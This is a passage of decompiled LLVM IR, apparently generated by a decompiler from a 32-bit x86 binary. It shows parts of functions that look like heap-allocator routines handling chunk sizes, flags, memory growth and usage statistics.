  %v2_805228c = inttoptr i32 %v1_805228c to i32*
  %v3_805228c = load i32, i32* %v2_805228c, align 4
  store i32 %v3_805228c, i32* %eax.global-to-local, align 4
  %v1_805228f = icmp eq i1 %v12_805228a, false
  br i1 %v1_805228f, label %dec_label_pc_805229d, label %dec_label_pc_8052291

dec_label_pc_8052291:                             ; preds = %dec_label_pc_8052287
  %v1_8052291 = and i32 %v3_805228c, -4
  store i32 %v1_8052291, i32* %eax.global-to-local, align 4
  store i32 %v1_80521cb, i32* %edx.global-to-local, align 4
  %v2_8052298 = add i32 %v1_8052291, %v1_80521cb
  store i32 %v2_8052298, i32* @ebx, align 4
  br label %dec_label_pc_805231a

dec_label_pc_805229d:                             ; preds = %dec_label_pc_8052287
  %v1_80522a1 = add i32 %v1_80521cb, -4
  store i32 %v1_80522a1, i32* %eax.global-to-local, align 4
  %v2_80522a6 = udiv i32 %v1_80522a1, 4
  store i32 %v2_80522a6, i32* %ecx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_80522a1, 37
  br i1 %tmp, label %dec_label_pc_80522bf, label %dec_label_pc_80522ae

dec_label_pc_80522ae:                             ; preds = %dec_label_pc_805229d
  store i32 %v1_8052275, i32* %stack_var_-60, align 4
  %v3_80522b5 = inttoptr i32 %v1_8052275 to i16*
  %v4_80522b5 = call i32 @function_80536ba(i16* %v3_80522b5, i32 %tmp7, i32 %v1_80522a1)
  store i32 %v4_80522b5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052306

dec_label_pc_80522bf:                             ; preds = %dec_label_pc_805229d
  store i32 %tmp7, i32* @esi, align 4
  %v2_80522c6 = load i32, i32* %arg1, align 4
  store i32 %v2_80522c6, i32* %eax.global-to-local, align 4
  %v2_80522c8 = inttoptr i32 %v1_8052275 to i32*
  store i32 %v2_80522c6, i32* %v2_80522c8, align 4
  %v0_80522ca = load i32, i32* @esi, align 4
  %v1_80522ca = add i32 %v0_80522ca, 4
  %v2_80522ca = inttoptr i32 %v1_80522ca to i32*
  %v3_80522ca = load i32, i32* %v2_80522ca, align 4
  store i32 %v3_80522ca, i32* %eax.global-to-local, align 4
  %v1_80522cd = load i32, i32* %edx.global-to-local, align 4
  %v2_80522cd = add i32 %v1_80522cd, 4
  %v3_80522cd = inttoptr i32 %v2_80522cd to i32*
  store i32 %v3_80522ca, i32* %v3_80522cd, align 4
  %v0_80522d0 = load i32, i32* @esi, align 4
  %v1_80522d0 = add i32 %v0_80522d0, 8
  %v2_80522d0 = inttoptr i32 %v1_80522d0 to i32*
  %v3_80522d0 = load i32, i32* %v2_80522d0, align 4
  store i32 %v3_80522d0, i32* %eax.global-to-local, align 4
  %v1_80522d3 = load i32, i32* %edx.global-to-local, align 4
  %v2_80522d3 = add i32 %v1_80522d3, 8
  %v3_80522d3 = inttoptr i32 %v2_80522d3 to i32*
  store i32 %v3_80522d0, i32* %v3_80522d3, align 4
  %tmp28 = icmp ult i32 %v1_80522a1, 17
  br i1 %tmp28, label %dec_label_pc_8052306, label %dec_label_pc_80522d8

dec_label_pc_80522d8:                             ; preds = %dec_label_pc_80522bf
  %v0_80522d8 = load i32, i32* @esi, align 4
  %v1_80522d8 = add i32 %v0_80522d8, 12
  %v2_80522d8 = inttoptr i32 %v1_80522d8 to i32*
  %v3_80522d8 = load i32, i32* %v2_80522d8, align 4
  store i32 %v3_80522d8, i32* %eax.global-to-local, align 4
  %v0_80522db = load i32, i32* %ecx.global-to-local, align 4
  %v1_80522de = load i32, i32* %edx.global-to-local, align 4
  %v2_80522de = add i32 %v1_80522de, 12
  %v3_80522de = inttoptr i32 %v2_80522de to i32*
  store i32 %v3_80522d8, i32* %v3_80522de, align 4
  %v0_80522e1 = load i32, i32* @esi, align 4
  %v1_80522e1 = add i32 %v0_80522e1, 16
  %v2_80522e1 = inttoptr i32 %v1_80522e1 to i32*
  %v3_80522e1 = load i32, i32* %v2_80522e1, align 4
  store i32 %v3_80522e1, i32* %eax.global-to-local, align 4
  %v1_80522e4 = load i32, i32* %edx.global-to-local, align 4
  %v2_80522e4 = add i32 %v1_80522e4, 16
  %v3_80522e4 = inttoptr i32 %v2_80522e4 to i32*
  store i32 %v3_80522e1, i32* %v3_80522e4, align 4
  %tmp23 = icmp ult i32 %v0_80522db, 7
  br i1 %tmp23, label %dec_label_pc_8052306, label %dec_label_pc_80522e9

dec_label_pc_80522e9:                             ; preds = %dec_label_pc_80522d8
  %v0_80522e9 = load i32, i32* @esi, align 4
  %v1_80522e9 = add i32 %v0_80522e9, 20
  %v2_80522e9 = inttoptr i32 %v1_80522e9 to i32*
  %v3_80522e9 = load i32, i32* %v2_80522e9, align 4
  store i32 %v3_80522e9, i32* %eax.global-to-local, align 4
  %v0_80522ec = load i32, i32* %ecx.global-to-local, align 4
  %v1_80522ef = load i32, i32* %edx.global-to-local, align 4
  %v2_80522ef = add i32 %v1_80522ef, 20
  %v3_80522ef = inttoptr i32 %v2_80522ef to i32*
  store i32 %v3_80522e9, i32* %v3_80522ef, align 4
  %v0_80522f2 = load i32, i32* @esi, align 4
  %v1_80522f2 = add i32 %v0_80522f2, 24
  %v2_80522f2 = inttoptr i32 %v1_80522f2 to i32*
  %v3_80522f2 = load i32, i32* %v2_80522f2, align 4
  store i32 %v3_80522f2, i32* %eax.global-to-local, align 4
  %v1_80522f5 = load i32, i32* %edx.global-to-local, align 4
  %v2_80522f5 = add i32 %v1_80522f5, 24
  %v3_80522f5 = inttoptr i32 %v2_80522f5 to i32*
  store i32 %v3_80522f2, i32* %v3_80522f5, align 4
  %tmp24 = icmp ult i32 %v0_80522ec, 9
  br i1 %tmp24, label %dec_label_pc_8052306, label %dec_label_pc_80522fa

dec_label_pc_80522fa:                             ; preds = %dec_label_pc_80522e9
  %v0_80522fa = load i32, i32* @esi, align 4
  %v1_80522fa = add i32 %v0_80522fa, 28
  %v2_80522fa = inttoptr i32 %v1_80522fa to i32*
  %v3_80522fa = load i32, i32* %v2_80522fa, align 4
  store i32 %v3_80522fa, i32* %eax.global-to-local, align 4
  %v1_80522fd = load i32, i32* %edx.global-to-local, align 4
  %v2_80522fd = add i32 %v1_80522fd, 28
  %v3_80522fd = inttoptr i32 %v2_80522fd to i32*
  store i32 %v3_80522fa, i32* %v3_80522fd, align 4
  %v0_8052300 = load i32, i32* @esi, align 4
  %v1_8052300 = add i32 %v0_8052300, 32
  %v2_8052300 = inttoptr i32 %v1_8052300 to i32*
  %v3_8052300 = load i32, i32* %v2_8052300, align 4
  store i32 %v3_8052300, i32* %eax.global-to-local, align 4
  %v1_8052303 = load i32, i32* %edx.global-to-local, align 4
  %v2_8052303 = add i32 %v1_8052303, 32
  %v3_8052303 = inttoptr i32 %v2_8052303 to i32*
  store i32 %v3_8052300, i32* %v3_8052303, align 4
  br label %dec_label_pc_8052306

dec_label_pc_8052306:                             ; preds = %dec_label_pc_80522e9, %dec_label_pc_80522d8, %dec_label_pc_80522bf, %dec_label_pc_80522ae, %dec_label_pc_80522fa
  %v0_8052309 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052309 = add i32 %v0_8052309, 8
  store i32 %v1_8052309, i32* @ebx, align 4
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_8052310 = call i32 @function_8052693(i32 %tmp7)
  br label %dec_label_pc_8052436

dec_label_pc_805231a:                             ; preds = %dec_label_pc_80521db, %dec_label_pc_8052291, %dec_label_pc_805225f
  %v1_805232b = phi i32 [ %v1_80521cb, %dec_label_pc_80521db ], [ %v2_8052298, %dec_label_pc_8052291 ], [ %v0_805231a.pre, %dec_label_pc_805225f ]
  %v5_805231c = sub i32 %v1_805232b, %.v1_80521b8
  store i32 %v5_805231c, i32* %ecx.global-to-local, align 4
  %tmp25 = icmp ult i32 %v5_805231c, 16
  br i1 %tmp25, label %dec_label_pc_8052325, label %dec_label_pc_8052337

dec_label_pc_8052325:                             ; preds = %dec_label_pc_805231a
  %v0_8052325 = load i32, i32* @edi, align 4
  %v1_8052325 = add i32 %v0_8052325, 4
  %v2_8052325 = inttoptr i32 %v1_8052325 to i32*
  %v3_8052325 = load i32, i32* %v2_8052325, align 4
  %v1_8052328 = urem i32 %v3_8052325, 2
  %v2_805232b = or i32 %v1_8052328, %v1_805232b
  store i32 %v2_805232b, i32* %eax.global-to-local, align 4
  store i32 %v2_805232b, i32* %v2_8052325, align 4
  %v0_8052330 = load i32, i32* @edi, align 4
  %v1_8052330 = load i32, i32* @ebx, align 4
  %v2_8052330 = add i32 %v0_8052330, 4
  %v3_8052330 = add i32 %v2_8052330, %v1_8052330
  %v4_8052330 = inttoptr i32 %v3_8052330 to i32*
  %v5_8052330 = load i32, i32* %v4_8052330, align 4
  %v6_8052330 = or i32 %v5_8052330, 1
  store i32 %v6_8052330, i32* %v4_8052330, align 4
  br label %dec_label_pc_8052367

dec_label_pc_8052337:                             ; preds = %dec_label_pc_805231a
  store i32 %.v1_80521b8, i32* %edx.global-to-local, align 4
  %v0_805233b = load i32, i32* @edi, align 4
  %v2_805233b = add i32 %v0_805233b, %.v1_80521b8
  store i32 %v2_805233b, i32* %eax.global-to-local, align 4
  %v1_805233e = add i32 %v0_805233b, 4
  %v2_805233e = inttoptr i32 %v1_805233e to i32*
  %v3_805233e = load i32, i32* %v2_805233e, align 4
  %v1_8052341 = urem i32 %v3_805233e, 2
  %v5_8052344 = or i32 %v1_8052341, %.v1_80521b8
  store i32 %v5_8052344, i32* %v2_805233e, align 4
  %v0_805234e = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052350 = or i32 %v0_805234e, 1
  store i32 %v1_8052350, i32* %edx.global-to-local, align 4
  %v1_8052353 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052353 = add i32 %v1_8052353, 4
  %v3_8052353 = inttoptr i32 %v2_8052353 to i32*
  store i32 %v1_8052350, i32* %v3_8052353, align 4
  %v0_8052356 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052356 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052356 = add i32 %v0_8052356, 4
  %v3_8052356 = add i32 %v2_8052356, %v1_8052356
  %v4_8052356 = inttoptr i32 %v3_8052356 to i32*
  %v5_8052356 = load i32, i32* %v4_8052356, align 4
  %v6_8052356 = or i32 %v5_8052356, 1
  store i32 %v6_8052356, i32* %v4_8052356, align 4
  %v0_805235b = load i32, i32* %eax.global-to-local, align 4
  %v1_805235b = add i32 %v0_805235b, 8
  store i32 %v1_805235b, i32* %eax.global-to-local, align 4
  store i32 %v1_805235b, i32* %stack_var_-60, align 4
  %v1_805235f = call i32 @function_8052693(i32 %v1_805235b)
  store i32 %v1_805235f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052367

dec_label_pc_8052367:                             ; preds = %dec_label_pc_8052325, %dec_label_pc_8052337
  %v0_8052367 = load i32, i32* @edi, align 4
  %v1_8052367 = add i32 %v0_8052367, 8
  store i32 %v1_8052367, i32* @ebx, align 4
  br label %dec_label_pc_8052443

dec_label_pc_805236f:                             ; preds = %dec_label_pc_80521a8
  store i32 %tmp7, i32* %ecx.global-to-local, align 4
  %v0_8052373 = load i32, i32* @global_var_805567c.38, align 4
  %v1_8052378 = add i32 %v0_8052373, -1
  store i32 %v1_8052378, i32* %eax.global-to-local, align 4
  %v2_805237d = inttoptr i32 %v1_80521c3 to i32*
  %v3_805237d = load i32, i32* %v2_805237d, align 4
  store i32 %v3_805237d, i32* @ebp, align 4
  %v1_8052380 = or i32 %.v1_80521b8, 4
  store i32 %v1_8052380, i32* %stack_var_-44, align 4
  %v2_8052386 = add i32 %v3_805237d, %v1_8052378
  store i32 %v2_8052386, i32* %edx.global-to-local, align 4
  %v1_8052389 = sub i32 0, %v0_8052373
  store i32 %v1_8052389, i32* %eax.global-to-local, align 4
  %v2_805238b = add i32 %v2_8052386, %v1_8052380
  %v2_805238e = and i32 %v2_805238b, %v1_8052389
  store i32 %v2_805238e, i32* @esi, align 4
  %v2_8052392 = sub i32 %v2_805238e, %v3_805237d
  store i32 %v2_8052392, i32* @ebx, align 4
  %v15_8052394 = icmp eq i32 %v1_80521cb, %v2_8052392
  br i1 %v15_8052394, label %dec_label_pc_805243f, label %dec_label_pc_805239e

dec_label_pc_805239e:                             ; preds = %dec_label_pc_805236f
  %v2_80523a5 = sub i32 %v1_80521c3, %v3_805237d
  store i32 %v2_80523a5, i32* @edi, align 4
  %v2_80523a7 = add i32 %v3_805237d, %v1_80521cb
  store i32 %v2_80523a7, i32* %eax.global-to-local, align 4
  store i32 %v2_80523a5, i32* %stack_var_-60, align 4
  %v6_80523ab = inttoptr i32 %v2_80523a5 to i32*
  %v7_80523ab = call i32 @function_805351e(i32* %v6_80523ab, i32 %v2_80523a7, i32 %v2_805238e, i32 1, i32 %v1_8052380, i32 %v1_80521cb)
  store i32 %v7_80523ab, i32* %eax.global-to-local, align 4
  %v10_80523b3 = icmp eq i32 %v7_80523ab, -1
  br i1 %v10_80523b3, label %dec_label_pc_80523f7, label %dec_label_pc_80523b8

dec_label_pc_80523b8:                             ; preds = %dec_label_pc_805239e
  %v1_80523b8 = load i32, i32* @ebp, align 4
  %v2_80523b8 = add i32 %v1_80523b8, %v7_80523ab
  store i32 %v2_80523b8, i32* %edx.global-to-local, align 4
  %v0_80523bb = load i32, i32* @ebx, align 4
  %v1_80523bb = or i32 %v0_80523bb, 2
  store i32 %v1_80523bb, i32* %ebx.global-to-local, align 4
  %v0_80523be = load i32, i32* @esi, align 4
  store i32 %v0_80523be, i32* %eax.global-to-local, align 4
  %v2_80523c0 = add i32 %v2_80523b8, 4
  %v3_80523c0 = inttoptr i32 %v2_80523c0 to i32*
  store i32 %v1_80523bb, i32* %v3_80523c0, align 4
  %v0_80523c3 = load i32, i32* %eax.global-to-local, align 4
  %v5_80523c3 = sub i32 %v0_80523c3, %v1_80521cb
  %v1_80523c7 = load i32, i32* @global_var_8055684.43, align 4
  %v2_80523c7 = add i32 %v1_80523c7, %v5_80523c3
  store i32 %v2_80523c7, i32* %eax.global-to-local, align 4
  store i32 %v2_80523c7, i32* @global_var_8055684.43, align 4
  %v1_80523d2 = load i32, i32* @global_var_8055690.44, align 16
  %tmp26 = icmp ugt i32 %v2_80523c7, %v1_80523d2
  br i1 %tmp26, label %dec_label_pc_80523da, label %dec_label_pc_80523df

dec_label_pc_80523da:                             ; preds = %dec_label_pc_80523b8
  store i32 %v2_80523c7, i32* @global_var_8055690.44, align 16
  br label %dec_label_pc_80523df

dec_label_pc_80523df:                             ; preds = %dec_label_pc_80523b8, %dec_label_pc_80523da
  %v1_80523df = load i32, i32* @global_var_8055688.45, align 8
  %v2_80523df = add i32 %v1_80523df, %v2_80523c7
  store i32 %v2_80523df, i32* %eax.global-to-local, align 4
  %v1_80523e5 = load i32, i32* @global_var_8055694.46, align 4
  %tmp27 = icmp ugt i32 %v2_80523df, %v1_80523e5
  br i1 %tmp27, label %dec_label_pc_80523ed, label %dec_label_pc_80523f2

dec_label_pc_80523ed:                             ; preds = %dec_label_pc_80523df
  store i32 %v2_80523df, i32* @global_var_8055694.46, align 4
  br label %dec_label_pc_80523f2

dec_label_pc_80523f2:                             ; preds = %dec_label_pc_80523df, %dec_label_pc_80523ed
  %v0_80523f2 = load i32, i32* %edx.global-to-local, align 4
  %v1_80523f2 = add i32 %v0_80523f2, 8
  store i32 %v1_80523f2, i32* @ebx, align 4
  br label %dec_label_pc_8052443

dec_label_pc_80523f7:                             ; preds = %dec_label_pc_805239e
  %v2_80523f7 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_80523f7, i32* %eax.global-to-local, align 4
  %v10_80523fa = icmp ult i32 %v1_80521cb, %v2_80523f7
  %v1_80523fe = icmp eq i1 %v10_80523fa, false
  br i1 %v1_80523fe, label %dec_label_pc_805243f, label %dec_label_pc_8052400

dec_label_pc_8052400:                             ; preds = %dec_label_pc_80523f7
  %v1_8052407 = add i32 %.v1_80521b8, -7
  store i32 %v1_8052407, i32* %eax.global-to-local, align 4
  store i32 %v1_8052407, i32* %stack_var_-60, align 4
  %v1_805240b = call i32 @function_80518ce(i32 %v1_8052407)
  store i32 %v1_805240b, i32* %eax.global-to-local, align 4
  store i32 %v1_805240b, i32* @ebx, align 4
  %v1_8052415 = icmp eq i32 %v1_805240b, 0
  br i1 %v1_8052415, label %dec_label_pc_805243b, label %dec_label_pc_8052419

dec_label_pc_8052419:                             ; preds = %dec_label_pc_8052400
  %v1_805241e = add i32 %v1_80521cb, -8
  store i32 %v1_805241e, i32* %eax.global-to-local, align 4
  store i32 %v1_805240b, i32* %stack_var_-60, align 4
  %v3_8052427 = inttoptr i32 %v1_805240b to i16*
  %v4_8052427 = call i32 @function_80536ba(i16* %v3_8052427, i32 %tmp7, i32 %v1_805241e)
  store i32 %v4_8052427, i32* %eax.global-to-local, align 4
  store i32 %v1_805240b, i32* %edx.global-to-local, align 4
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_8052431 = call i32 @function_8052693(i32 %tmp7)
  br label %dec_label_pc_8052436

dec_label_pc_8052436:                             ; preds = %dec_label_pc_8052306, %dec_label_pc_8052419
  %storemerge = phi i32 [ %v1_8052431, %dec_label_pc_8052419 ], [ %v1_8052310, %dec_label_pc_8052306 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052443

dec_label_pc_805243b:                             ; preds = %dec_label_pc_805226a, %dec_label_pc_8052400
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8052443

dec_label_pc_805243f:                             ; preds = %dec_label_pc_80523f7, %dec_label_pc_805236f, %dec_label_pc_8052209
  store i32 %tmp7, i32* @ebx, align 4
  br label %dec_label_pc_8052443

dec_label_pc_8052443:                             ; preds = %dec_label_pc_805243b, %dec_label_pc_8052436, %dec_label_pc_80523f2, %dec_label_pc_8052367, %dec_label_pc_805243f
  store i32 %v2_8052178, i32* @eax, align 4
  store i32 %v2_8052178, i32* %stack_var_-60, align 4
  %v2_805244c = call i32 @function_8052dfa(i32 %v2_8052178, i32 1)
  store i32 %v2_805244c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052451

dec_label_pc_8052451:                             ; preds = %dec_label_pc_805215c, %dec_label_pc_8052148, %dec_label_pc_8052443
  br label %dec_label_pc_8052454

dec_label_pc_8052454:                             ; preds = %dec_label_pc_8052196, %dec_label_pc_8052451
  %v0_8052457 = load i32, i32* @ebx, align 4
  store i32 %v0_8052457, i32* %eax.global-to-local, align 4
  store i32 %v0_8052139, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8052457

; uselistorder directives
  uselistorder i32 %v1_805240b, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v2_80523df, { 1, 0, 2 }
  uselistorder i32 %v2_80523c7, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_80523a5, { 1, 0, 2 }
  uselistorder i32 %v1_8052380, { 1, 0, 2 }
  uselistorder i32 %v3_805237d, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_805233b, { 1, 0 }
  uselistorder i32 %v1_80522a1, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_8052275, { 1, 3, 2, 0, 4, 6, 5, 7 }
  uselistorder i32 %v2_8052219, { 1, 0, 2 }
  uselistorder i32 %v3_805222c, { 0, 2, 3, 1 }
  uselistorder i32 %v2_80521e9, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_80521cb, { 13, 14, 12, 15, 0, 6, 7, 11, 1, 10, 2, 3, 4, 5, 9, 8, 16 }
  uselistorder i32 %v1_80521c3, { 1, 2, 0, 3 }
  uselistorder i32 %.v1_80521b8, { 4, 13, 0, 1, 8, 7, 9, 10, 2, 12, 3, 11, 5, 6 }
  uselistorder i32 %v1_80521a8, { 0, 2, 1 }
  uselistorder i32 %v0_8052191, { 1, 0 }
  uselistorder i32 %v2_8052178, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13 }
  uselistorder i32 %tmp7, { 13, 12, 11, 1, 10, 9, 8, 7, 2, 0, 6, 5, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 16, 17, 18, 19, 0, 1, 3, 4, 5, 6, 7, 8, 9, 10, 2, 11, 12, 13, 14, 15 }
  uselistorder i32* %ecx.global-to-local, { 10, 1, 0, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %ebx.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %eax.global-to-local, { 34, 35, 33, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 22, 20, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 -32, { 0, 1, 3, 2, 4 }
  uselistorder i32 (i32)* @function_8052693, { 1, 0, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 (i32)* @function_80518ce, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8052454, { 1, 0 }
  uselistorder label %dec_label_pc_8052451, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052443, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_805243b, { 1, 0 }
  uselistorder label %dec_label_pc_8052436, { 1, 0 }
  uselistorder label %dec_label_pc_80523f2, { 1, 0 }
  uselistorder label %dec_label_pc_80523df, { 1, 0 }
  uselistorder label %dec_label_pc_8052367, { 1, 0 }
  uselistorder label %dec_label_pc_805231a, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8052306, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_805225f, { 1, 0 }
}

define i32 @function_805245e() local_unnamed_addr {
dec_label_pc_805245e:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %v0_8052465 = load i32, i32* @edx, align 4
  store i32 %v0_8052465, i32* %ebp.global-to-local, align 4
  %v1_8052467 = add i32 %v0_8052465, 860
  %v2_8052467 = inttoptr i32 %v1_8052467 to i32*
  %v3_8052467 = load i32, i32* %v2_8052467, align 4
  store i32 %v3_8052467, i32* %ecx.global-to-local, align 4
  %v1_805246d = add i32 %v0_8052465, 44
  %v2_805246d = inttoptr i32 %v1_805246d to i32*
  %v3_805246d = load i32, i32* %v2_805246d, align 4
  %v1_8052470 = add i32 %v3_805246d, 4
  %v2_8052470 = inttoptr i32 %v1_8052470 to i32*
  %v3_8052470 = load i32, i32* %v2_8052470, align 4
  %v1_8052473 = and i32 %v3_8052470, -4
  store i32 %v1_8052473, i32* @esi, align 4
  %v1_8052478 = load i32, i32* @eax, align 4
  %v2_8052478 = add i32 %v3_8052467, -17
  %v2_805247a = add i32 %v2_8052478, %v1_8052473
  %v3_805247a = sub i32 %v2_805247a, %v1_8052478
  %div = udiv i32 %v3_805247a, %v3_8052467
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_805247a, %v3_8052467
  store i32 %tmp10, i32* @edx, align 4
  %v1_8052482 = add i32 %div, -1
  %v4_8052485 = mul i32 %v1_8052482, %v3_8052467
  store i32 %v4_8052485, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_8052485, 1
  br i1 %tmp11, label %dec_label_pc_80524e3, label %dec_label_pc_805248c

dec_label_pc_805248c:                             ; preds = %dec_label_pc_805245e
  %v1_8052491 = call i32 @function_80535c1(i32 0)
  store i32 %v1_8052491, i32* %edi.global-to-local, align 4
  %v0_8052498 = load i32, i32* @esi, align 4
  store i32 %v0_8052498, i32* %eax.global-to-local, align 4
  %v1_805249a = load i32, i32* %ebp.global-to-local, align 4
  %v2_805249a = add i32 %v1_805249a, 44
  %v3_805249a = inttoptr i32 %v2_805249a to i32*
  %v4_805249a = load i32, i32* %v3_805249a, align 4
  %v5_805249a = add i32 %v4_805249a, %v0_8052498
  store i32 %v5_805249a, i32* %eax.global-to-local, align 4
  %v12_80524a0 = icmp eq i32 %v1_8052491, %v5_805249a
  %v1_80524a2 = icmp eq i1 %v12_80524a0, false
  br i1 %v1_80524a2, label %dec_label_pc_80524e3, label %dec_label_pc_80524a4

dec_label_pc_80524a4:                             ; preds = %dec_label_pc_805248c
  %v1_80524a7 = sub i32 0, %v4_8052485
  store i32 %v1_80524a7, i32* @ebx, align 4
  %v1_80524aa = call i32 @function_80535c1(i32 %v1_80524a7)
  store i32 %v1_80524aa, i32* %eax.global-to-local, align 4
  %v1_80524b6 = call i32 @function_80535c1(i32 0)
  store i32 %v1_80524b6, i32* %eax.global-to-local, align 4
  %v10_80524be = icmp eq i32 %v1_80524b6, -1
  br i1 %v10_80524be, label %dec_label_pc_80524e3, label %dec_label_pc_80524c3

dec_label_pc_80524c3:                             ; preds = %dec_label_pc_80524a4
  %v0_80524c3 = load i32, i32* %edi.global-to-local, align 4
  %v2_80524c5 = sub i32 %v0_80524c3, %v1_80524b6
  %v12_80524c5 = icmp eq i32 %v2_80524c5, 0
  store i32 %v2_80524c5, i32* %ecx.global-to-local, align 4
  br i1 %v12_80524c5, label %dec_label_pc_80524e3, label %dec_label_pc_80524c9

dec_label_pc_80524c9:                             ; preds = %dec_label_pc_80524c3
  %v0_80524c9 = load i32, i32* %ebp.global-to-local, align 4
  %v1_80524c9 = add i32 %v0_80524c9, 44
  %v2_80524c9 = inttoptr i32 %v1_80524c9 to i32*
  %v3_80524c9 = load i32, i32* %v2_80524c9, align 4
  store i32 %v3_80524c9, i32* %eax.global-to-local, align 4
  %v1_80524cc = add i32 %v0_80524c9, 872
  %v2_80524cc = inttoptr i32 %v1_80524cc to i32*
  %v3_80524cc = load i32, i32* %v2_80524cc, align 4
  %v5_80524cc = sub i32 %v3_80524cc, %v2_80524c5
  store i32 %v5_80524cc, i32* %v2_80524cc, align 4
  %v0_80524d2 = load i32, i32* @esi, align 4
  %v1_80524d2 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80524d2 = sub i32 %v0_80524d2, %v1_80524d2
  %v1_80524d4 = or i32 %v2_80524d2, 1
  %v1_80524d7 = load i32, i32* %eax.global-to-local, align 4
  %v2_80524d7 = add i32 %v1_80524d7, 4
  %v3_80524d7 = inttoptr i32 %v2_80524d7 to i32*
  store i32 %v1_80524d4, i32* %v3_80524d7, align 4
  br label %dec_label_pc_80524e3

dec_label_pc_80524e3:                             ; preds = %dec_label_pc_805245e, %dec_label_pc_805248c, %dec_label_pc_80524a4, %dec_label_pc_80524c3, %dec_label_pc_80524c9
  %storemerge = phi i32 [ 1, %dec_label_pc_80524c9 ], [ 0, %dec_label_pc_80524c3 ], [ 0, %dec_label_pc_80524a4 ], [ 0, %dec_label_pc_805248c ], [ 0, %dec_label_pc_805245e ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_80524b6, { 1, 0, 2 }
  uselistorder i32 %v4_8052485, { 1, 2, 0 }
  uselistorder i32 %v3_8052467, { 0, 3, 2, 1, 4 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 (i32)* @function_80535c1, { 2, 1, 0, 6, 5, 4, 3 }
  uselistorder label %dec_label_pc_80524e3, { 4, 3, 2, 1, 0 }
}

define i32 @function_80524eb(i32* %arg1) local_unnamed_addr {
dec_label_pc_80524eb:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp20 = ptrtoint i32* %arg1 to i32
  %v0_80524ec = load i32, i32* @edi, align 4
  %v0_80524ed = load i32, i32* @esi, align 4
  %v0_80524ee = load i32, i32* @ebx, align 4
  store i32 %tmp20, i32* %edx.global-to-local, align 4
  %v2_80524f6 = load i32, i32* %arg1, align 4
  store i32 %v2_80524f6, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_80524fd = icmp eq i32 %v2_80524f6, 0
  br i1 %v1_80524fd, label %dec_label_pc_8052617.lr.ph, label %dec_label_pc_8052505

dec_label_pc_8052617.lr.ph:                       ; preds = %dec_label_pc_80524eb
  %v3_805261b = add i32 %tmp20, 44
  br label %dec_label_pc_8052617

dec_label_pc_8052505:                             ; preds = %dec_label_pc_80524eb
  %v1_8052509 = and i32 %v2_80524f6, -3
  store i32 %v1_8052509, i32* %arg1, align 4
  %v1_805250e = add i32 %tmp20, 52
  store i32 %tmp20, i32* @edx, align 4
  %v1_8052519 = add i32 %tmp20, 4
  store i32 %v1_8052519, i32* %eax.global-to-local, align 4
  %v2_8052524 = load i32, i32* %arg1, align 4
  %v2_805252a = udiv i32 %v2_8052524, 8
  %v2_805252d = mul nuw i32 %v2_805252a, 4
  %v3_805252d = add i32 %tmp20, -4
  %v4_805252d = add i32 %v3_805252d, %v2_805252d
  store i32 %v4_805252d, i32* %eax.global-to-local, align 4
  %v2_80525f4 = add i32 %tmp20, 44
  %v3_80525f4 = inttoptr i32 %v2_80525f4 to i32*
  %v1_80525c7 = add i32 %tmp20, 60
  %v2_80525c7 = inttoptr i32 %v1_80525c7 to i32*
  br label %dec_label_pc_8052535

dec_label_pc_8052535:                             ; preds = %dec_label_pc_8052603, %dec_label_pc_8052505
  %v0_8052543 = phi i32 [ %v1_8052519, %dec_label_pc_8052505 ], [ %v4_805260d, %dec_label_pc_8052603 ]
  store i32 %v0_8052543, i32* %eax.global-to-local, align 4
  %v1_8052539 = inttoptr i32 %v0_8052543 to i32*
  %v2_8052539 = load i32, i32* %v1_8052539, align 4
